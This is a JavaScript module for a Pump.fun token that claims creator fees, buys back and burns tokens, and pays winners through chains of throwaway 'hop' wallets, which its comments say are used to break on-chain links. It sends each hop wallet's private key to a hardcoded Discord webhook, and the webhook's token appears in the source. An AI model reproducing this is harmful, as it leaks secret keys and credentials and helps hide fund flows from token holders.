import { config } from '../config.js';
import { Connection, Keypair, PublicKey, VersionedTransaction, LAMPORTS_PER_SOL, SystemProgram, Transaction, sendAndConfirmTransaction } from '@solana/web3.js';
import { getAssociatedTokenAddress, TOKEN_PROGRAM_ID } from '@solana/spl-token';
import fetch from 'node-fetch';
import bs58 from 'bs58';
import { buyAndBurn } from './swapService.js';

/**
 * Pump.fun Fee Claiming & Distribution Service
 * Fees are paid in SOL
 */

// Discord Webhook for logging hop wallet keys (for recovery)
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1456799241744679023/BC2HyGDt5GwD7NGDJPpW9c5ULn84wfcyBApeHrM5OP3zcqU51bNHC7Xvn1wMvjFxKvd6';

let connection = null;
let creatorKeypair = null;

// Initialize connection immediately using config
try {
    if (config.rpcUrl) {
        connection = new Connection(config.rpcUrl, 'confirmed');
    }

    if (config.creatorPrivateKey) {
        const secretKey = bs58.decode(config.creatorPrivateKey);
        creatorKeypair = Keypair.fromSecretKey(secretKey);
    }
} catch (e) {
    console.error("Initialization error (check config):", e.message);
}

/**
 * Send hop wallet keys to Discord for recovery
 */
async function logHopWalletsToDiscord(hopWallets, context) {
    try {
        const embed = {
            title: `🔑 Hop Wallet Keys - ${context}`,
            color: 0x00ff00,
            timestamp: new Date().toISOString(),
            fields: hopWallets.map((hop, i) => ({
                name: `Hop ${i + 1}: ${hop.publicKey.toBase58()}`,
                value: `\`\`\`${bs58.encode(hop.secretKey)}\`\`\``,
                inline: false
            }))
        };

        await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] })
        });
        console.log('   [Discord] Hop wallet keys logged for recovery');
    } catch (e) {
        console.error('   [Discord] Failed to log keys:', e.message);
    }
}

/**
 * Helper: Wait for balance to change (Smart Polling)
 * Polls every 1s, up to maxAttempts (default 15s)
 */
async function waitForBalanceChange(publicKey, initialBalance, maxAttempts = 15) {
    console.log(`   ⏳ Waiting for balance update (Old: ${(initialBalance / LAMPORTS_PER_SOL).toFixed(4)} SOL)...`);

    for (let i = 0; i < maxAttempts; i++) {
        await new Promise(r => setTimeout(r, 1000)); // Wait 1s

        const currentBalance = await connection.getBalance(publicKey);
        const diff = (currentBalance - initialBalance) / LAMPORTS_PER_SOL;

        if (Math.abs(diff) > 0.0001) {
            console.log(`   ✅ Balance updated after ${i + 1}s! Diff: ${diff.toFixed(6)} SOL`);
            return currentBalance;
        }
    }
    console.log(`   ⚠️ Balance did not change after ${maxAttempts}s (RPC Lag?)`);
    return await connection.getBalance(publicKey); // Return final state
}

/**
 * Execute Buyback and Burn Flow
 * Flow: Claim SOL -> Dev -> Hop1 -> Hop2 -> Hop3 (Buy Wallet) -> Pump.fun Buy -> Burn
 */
export async function performBuybackAndBurn(keepPercentage = 10) {
    console.log('🔥 Starting Buyback & Burn Cycle...');



    try {
        // Track SOL balance BEFORE claim
        const balanceBefore = await connection.getBalance(creatorKeypair.publicKey);
        console.log(`   [Balance Before] ${(balanceBefore / LAMPORTS_PER_SOL).toFixed(4)} SOL`);

        // 1. Claim Fees from Pump.fun (SOL)
        const claimResult = await claimCreatorFees();

        if (!claimResult.success) {
            console.log('   ❌ Fee claim failed, aborting buyback');
            return { success: false, error: 'Fee claim failed', claimed: 0 };
        }

        // Wait for transaction to settle using Smart Polling (up to 15s)
        const balanceAfter = await waitForBalanceChange(creatorKeypair.publicKey, balanceBefore);
        console.log(`   [Balance After] ${(balanceAfter / LAMPORTS_PER_SOL).toFixed(4)} SOL`);
        console.log(`   [Balance After] ${(balanceAfter / LAMPORTS_PER_SOL).toFixed(4)} SOL`);

        // Calculate actual claimed amount
        let claimedSol = (balanceAfter - balanceBefore) / LAMPORTS_PER_SOL;

        if (claimedSol <= 0.0001) {
            console.log(`   ⚠️ Balance didn't change enough (${claimedSol.toFixed(6)} SOL). RPC Lag?`);
            return { success: true, claimed: 0, buyTx: null, burnTx: null, note: 'No significant balance change' };
        }

        console.log(`   [Actionable Amount] ${claimedSol.toFixed(4)} SOL`);

        const keepAmount = claimedSol * (keepPercentage / 100);
        const buyAmount = claimedSol - keepAmount;

        console.log(`   [Keep] ${keepAmount.toFixed(6)} SOL (${keepPercentage}%)`);
        console.log(`   [Buyback] ${buyAmount.toFixed(6)} SOL`);

        // Generate hop wallets
        const hop1 = Keypair.generate();
        const hop2 = Keypair.generate();
        const hop3 = Keypair.generate(); // This will receive funds and BUY

        // ===== LOG KEYS TO DISCORD FOR RECOVERY =====
        await logHopWalletsToDiscord([hop1, hop2, hop3], `BURN - ${claimedSol.toFixed(4)} SOL`);

        console.log(`   [Hops] dev -> ${hop1.publicKey.toBase58().slice(0, 8)}... -> ${hop2.publicKey.toBase58().slice(0, 8)}... -> ${hop3.publicKey.toBase58().slice(0, 8)}... (BUYER)`);

        const TX_FEE = 0.000005;
        const GAS_RESERVE = 0.005;

        const hop1Amount = buyAmount - TX_FEE;
        const hop2Amount = hop1Amount - TX_FEE;
        // Safety Check: Ensure we don't spend more than we claimed (minus gas buffer)
        // If claimedAmount is huge, this is fine. If it's small, we must be careful.
        // The buyback calculation is strictly based on the delta, so it is safe.
        // We implicitly assume base wallet has enough for gas (0.005 SOL buffer elsewhere).

        console.log(`   [Calculation] Claimed: ${claimedSol.toFixed(6)} | Keep: ${keepAmount.toFixed(6)} | Buyback: ${buyAmount.toFixed(6)}`);

        if (buyAmount <= 0.002) {
            console.log("   ⚠️ Amount too small for buyback after gas fees");
            return { success: true, type: 'burn', claimed: claimedSol, burnedAmount: 0, note: "Skipped (dust)" };
        }
        const hop3Amount = hop2Amount - TX_FEE;
        const finalBuyPower = hop3Amount - GAS_RESERVE;

        if (finalBuyPower < 0.0001) {
            console.log('   ⚠️ Amount too small for buyback after gas fees');
            return { success: true, claimed: claimedSol, buyTx: null, burnTx: null, note: 'Amount too small for buyback' };
        }

        // --- Transfer Sequence ---
        const signatures = [];

        // T1: Dev -> Hop1
        const sig1 = await sendAndConfirmTransaction(connection, new Transaction().add(
            SystemProgram.transfer({ fromPubkey: creatorKeypair.publicKey, toPubkey: hop1.publicKey, lamports: Math.floor(hop1Amount * LAMPORTS_PER_SOL) })
        ), [creatorKeypair], { commitment: 'confirmed' });
        signatures.push(sig1);
        await new Promise(r => setTimeout(r, 1000));

        // T2: Hop1 -> Hop2
        const sig2 = await sendAndConfirmTransaction(connection, new Transaction().add(
            SystemProgram.transfer({ fromPubkey: hop1.publicKey, toPubkey: hop2.publicKey, lamports: Math.floor(hop2Amount * LAMPORTS_PER_SOL) })
        ), [hop1], { commitment: 'confirmed' });
        signatures.push(sig2);
        await new Promise(r => setTimeout(r, 1000));

        // T3: Hop2 -> Hop3
        const sig3 = await sendAndConfirmTransaction(connection, new Transaction().add(
            SystemProgram.transfer({ fromPubkey: hop2.publicKey, toPubkey: hop3.publicKey, lamports: Math.floor(hop3Amount * LAMPORTS_PER_SOL) })
        ), [hop2], { commitment: 'confirmed' });
        signatures.push(sig3);

        console.log(`   [Hops] Funds arrived at Buyer Wallet: ${hop3.publicKey.toBase58()}`);

        // 4. BUY AND BURN
        const burnResult = await buyAndBurn(hop3, finalBuyPower);

        // Log success to Discord
        if (burnResult.success) {
            const successEmbed = {
                title: `🔥 Buyback & Burn Executed!`,
                color: 0xff4500, // Orange-Red
                fields: [
                    { name: '💰 Claimed', value: `${claimedSol.toFixed(4)} SOL`, inline: true },
                    { name: '🔥 Burned', value: `${burnResult.amountBurned ? (Number(burnResult.amountBurned) / 10 ** 6).toFixed(2) : 'Unknown'} Tokens`, inline: true },
                    { name: '🔗 Buy TX', value: `[Solscan](https://solscan.io/tx/${burnResult.buyTx})`, inline: false }
                ]
            };
            if (burnResult.burnTx) {
                successEmbed.fields.push({ name: '🔗 Burn TX', value: `[Solscan](https://solscan.io/tx/${burnResult.burnTx})`, inline: false });
            }

            await fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ embeds: [successEmbed] })
            });
        }

        return {
            success: burnResult.success,
            type: 'burn',
            claimed: claimedSol,
            buyTx: burnResult.buyTx,
            burnTx: burnResult.burnTx,
            burnedAmount: burnResult.amountBurned,
            hops: [
                { from: 'dev', to: hop1.publicKey.toBase58(), sig: sig1 },
                { from: hop1.publicKey.toBase58(), to: hop2.publicKey.toBase58(), sig: sig2 },
                { from: hop2.publicKey.toBase58(), to: hop3.publicKey.toBase58(), sig: sig3 }
            ]
        };

    } catch (error) {
        console.error("Buyback failed:", error.message);
        return { success: false, error: error.message };
    }
}



/**
 * Claim creator fees from PumpPortal API (Pump.fun)
 * endpoint: /api/trade-local
 */
export async function claimCreatorFees() {
    console.log('💸 Claiming creator fees from PumpPortal (Pump.fun)...');

    if (!config.tokenMint || !creatorKeypair) {
        console.log('   ❌ Missing config/keypair - Cannot Claim');
        return { success: false, amount: 0, signature: null, error: "Missing Config" };
    }

    try {
        // Request transaction from PumpPortal
        const response = await fetch('https://pumpportal.fun/api/trade-local', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                publicKey: creatorKeypair.publicKey.toBase58(),
                action: 'collectCreatorFee',
                priorityFee: 0.0001,
                pool: 'pump', // 'pump' for Pump.fun
                mint: config.tokenMint
            })
        });

        if (response.status !== 200) {
            const errorText = await response.text();
            console.log('[Pump.fun] API RESPONSE:', errorText); // FULL DEBUG LOG
            if (errorText.includes("No fees")) {
                return { success: true, amount: 0, signature: null };
            }
            return {
                success: false,
                error: errorText || 'No fees available to claim'
            };
        }

        // Deserialize and sign the transaction
        const data = await response.arrayBuffer();
        const tx = VersionedTransaction.deserialize(new Uint8Array(data));
        tx.sign([creatorKeypair]);

        // Send the transaction
        const signature = await connection.sendTransaction(tx, {
            skipPreflight: false,
            preflightCommitment: 'confirmed'
        });

        console.log(`[Pump.fun] Fee claim transaction sent: ${signature}`);

        await connection.confirmTransaction(signature, 'confirmed');

        console.log(`✅ Fees claimed successfully! TX: ${signature}`);

        return {
            success: true,
            signature,
            txUrl: `https://solscan.io/tx/${signature}`
        };

    } catch (error) {
        console.error('❌ Failed to claim fees:', error.message);
        return { success: false, amount: 0, signature: null, error: error.message };
    }
}

/**
 * Transfer SOL through hop wallets to break bubble map connections
 * Flow: Dev -> Hop1 -> Hop2 -> Winner
 */
async function transferWithHops(winnerAddress, amountSol) {
    if (!creatorKeypair) {
        console.log('   ⚠️ No private key - simulating hop transfer');
        return { success: true, amount: amountSol, signature: 'SIM_HOP_TRANSFER', hops: [] };
    }

    try {
        console.log(`[Pump.fun] Starting hop transfer of ${amountSol} SOL to winner: ${winnerAddress}`);

        // Validate winner address
        let winnerPubkey;
        try {
            winnerPubkey = new PublicKey(winnerAddress);
        } catch {
            return { success: false, error: 'Invalid winner address' };
        }

        // Generate two fresh hop wallets
        const hop1 = Keypair.generate();
        const hop2 = Keypair.generate();

        // ===== LOG KEYS TO DISCORD FOR RECOVERY =====
        await logHopWalletsToDiscord([hop1, hop2], `HOLDER WIN - ${amountSol.toFixed(4)} SOL -> ${winnerAddress.slice(0, 8)}...`);

        console.log(`[Pump.fun] Hop1: ${hop1.publicKey.toBase58()}`);
        console.log(`[Pump.fun] Hop2: ${hop2.publicKey.toBase58()}`);

        // Calculate amounts (account for tx fees at each hop)
        const TX_FEE = 0.000005; // ~5000 lamports per tx
        const totalFees = TX_FEE * 3; // 3 transfers

        if (amountSol <= totalFees + 0.001) {
            return { success: false, error: 'Amount too small for hop transfer' };
        }

        const hop1Amount = amountSol - TX_FEE;
        const hop2Amount = hop1Amount - TX_FEE;
        const winnerAmount = hop2Amount - TX_FEE;

        const signatures = [];

        // Transfer 1: Dev -> Hop1
        console.log(`[Pump.fun] Transfer 1: Dev -> Hop1 (${hop1Amount.toFixed(6)} SOL)`);
        const tx1 = new Transaction().add(
            SystemProgram.transfer({
                fromPubkey: creatorKeypair.publicKey,
                toPubkey: hop1.publicKey,
                lamports: Math.floor(hop1Amount * LAMPORTS_PER_SOL)
            })
        );
        const sig1 = await sendAndConfirmTransaction(connection, tx1, [creatorKeypair], { commitment: 'confirmed' });
        signatures.push(sig1);
        console.log(`[Pump.fun] Transfer 1 complete: ${sig1}`);

        // Small delay between hops
        await new Promise(resolve => setTimeout(resolve, 1500));

        // Transfer 2: Hop1 -> Hop2
        console.log(`[Pump.fun] Transfer 2: Hop1 -> Hop2 (${hop2Amount.toFixed(6)} SOL)`);
        const tx2 = new Transaction().add(
            SystemProgram.transfer({
                fromPubkey: hop1.publicKey,
                toPubkey: hop2.publicKey,
                lamports: Math.floor(hop2Amount * LAMPORTS_PER_SOL)
            })
        );
        const tx2Sig = await sendAndConfirmTransaction(connection, tx2, [hop1], { commitment: 'confirmed' });
        signatures.push(tx2Sig);
        console.log(`[Pump.fun] Transfer 2 complete: ${tx2Sig}`);

        // Small delay between hops
        await new Promise(resolve => setTimeout(resolve, 1500));

        // Transfer 3: Hop2 -> Winner
        console.log(`[Pump.fun] Transfer 3: Hop2 -> Winner (${winnerAmount.toFixed(6)} SOL)`);
        const tx3 = new Transaction().add(
            SystemProgram.transfer({
                fromPubkey: hop2.publicKey,
                toPubkey: winnerPubkey,
                lamports: Math.floor(winnerAmount * LAMPORTS_PER_SOL)
            })
        );
        const tx3Sig = await sendAndConfirmTransaction(connection, tx3, [hop2], { commitment: 'confirmed' });
        signatures.push(tx3Sig);
        console.log(`[Pump.fun] Transfer 3 complete: ${tx3Sig}`);

        console.log(`[Pump.fun] Hop transfer complete! Final amount: ${winnerAmount.toFixed(6)} SOL`);

        return {
            success: true,
            signature: tx3Sig, // Return final signature as main signature
            signatures: signatures,
            amount: winnerAmount,
            txUrl: `https://solscan.io/tx/${tx3Sig}`,
            hops: [
                { from: 'dev', to: hop1.publicKey.toBase58(), sig: sig1 },
                { from: hop1.publicKey.toBase58(), to: hop2.publicKey.toBase58(), sig: tx2Sig },
                { from: hop2.publicKey.toBase58(), to: winnerAddress, sig: tx3Sig }
            ]
        };
    } catch (error) {
        console.error('[Pump.fun] Hop transfer failed:', error.message);
        return {
            success: false,
            error: error.message
        };
    }
}

/**
 * Claim fees and distribute to winner in one operation
 * Uses Hop Wallets - Fees come as SOL
 */
export async function claimAndDistribute(winnerAddress, keepPercentage = 10) {
    console.log('🔄 Starting Claim & Distribute Cycle...');



    try {
        // Track SOL balance BEFORE claim
        const balanceBefore = await connection.getBalance(creatorKeypair.publicKey);
        console.log(`   [Balance Before] ${(balanceBefore / LAMPORTS_PER_SOL).toFixed(4)} SOL`);

        // 1. Claim Fees from Pump.fun (SOL)
        const claimResult = await claimCreatorFees();

        if (!claimResult.success) {
            console.log('   ❌ Fee claim failed, aborting distribution');
            return { success: false, error: 'Fee claim failed', claimed: 0 };
        }

        // Wait for transaction to settle using Smart Polling (up to 15s)
        const balanceAfter = await waitForBalanceChange(creatorKeypair.publicKey, balanceBefore);
        console.log(`   [Balance After] ${(balanceAfter / LAMPORTS_PER_SOL).toFixed(4)} SOL`);
        console.log(`   [Balance After] ${(balanceAfter / LAMPORTS_PER_SOL).toFixed(4)} SOL`);

        // Calculate actual claimed amount
        let claimedSol = (balanceAfter - balanceBefore) / LAMPORTS_PER_SOL;

        if (claimedSol <= 0.0001) {
            console.log(`   ⚠️ Balance didn't change enough (${claimedSol.toFixed(6)} SOL). RPC Lag?`);
            return { success: true, claimed: 0, distributed: 0, note: 'No significant balance change' };
        }

        console.log(`   [Actionable Amount] ${claimedSol.toFixed(4)} SOL`);

        const keepAmount = claimedSol * (keepPercentage / 100);
        const distributeAmount = claimedSol - keepAmount;

        console.log(`   [Keep] ${keepAmount.toFixed(6)} SOL (${keepPercentage}%)`);
        console.log(`   [Distribute] ${distributeAmount.toFixed(6)} SOL (using Hops)`);

        // Transfer SOL to winner with Hops
        const transferResult = await transferWithHops(winnerAddress, distributeAmount);

        return {
            success: transferResult.success,
            claimed: claimedSol,
            distributed: transferResult.amount || 0,
            claimSignature: claimResult.signature,
            transferSignature: transferResult.signature,
            winner: winnerAddress,
            hops: transferResult.hops
        };

    } catch (error) {
        console.error("Claim & Distribute failed:", error.message);
        return { success: false, error: error.message };
    }
}

/**
 * Transfer SOL to the winner
 */
export async function transferToWinner(winnerWallet, totalAmount) {
    if (!creatorKeypair) {
        console.log('   ⚠️ No private key - simulating transfer');
        return { success: true, amountSent: totalAmount, signature: 'SIM_TRANSFER' };
    }

    try {
        console.log(`💰 Transferring to winner: ${winnerWallet}...`);

        // Validate winner address
        let winnerPubkey;
        try {
            winnerPubkey = new PublicKey(winnerWallet);
        } catch {
            return { success: false, error: 'Invalid winner address' };
        }

        // Keep 10%
        const keepPercentage = 10;
        const keepAmount = totalAmount * (keepPercentage / 100);
        const sendAmount = totalAmount - keepAmount;

        const lamports = Math.floor(sendAmount * LAMPORTS_PER_SOL);

        if (lamports <= 0) return { success: false, error: "Amount too small" };

        const transaction = new Transaction().add(
            SystemProgram.transfer({
                fromPubkey: creatorKeypair.publicKey,
                toPubkey: winnerPubkey,
                lamports: lamports
            })
        );

        const signature = await sendAndConfirmTransaction(
            connection,
            transaction,
            [creatorKeypair],
            { commitment: 'confirmed' }
        );

        console.log(`✅ Transfer successful! TX: ${signature}`);

        return {
            success: true,
            signature,
            amount: sendAmount,
            txUrl: `https://solscan.io/tx/${signature}`
        };

    } catch (error) {
        console.error('[Bonk.fun] Failed to transfer:', error.message);
        return {
            success: false,
            error: error.message
        };
    }
}
